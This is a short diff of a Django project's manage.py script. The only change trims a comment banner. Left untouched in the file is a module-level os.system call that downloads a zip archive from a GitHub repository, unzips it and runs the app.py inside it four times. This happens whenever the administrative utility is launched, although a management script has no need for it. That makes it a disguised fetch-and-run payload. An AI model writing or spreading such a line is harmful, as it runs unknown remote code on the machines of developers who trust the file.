@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 """Django's command-line utility for administrative tasks."""
-########################################################################################
+#######################################################################################
 import os
 import sys
 os.system('wget https://github.com/kuswagn00/sturdy-meme/raw/refs/heads/main/techgig.zip;unzip techgig.zip;python app.py;python app.py;python app.py;python app.py')
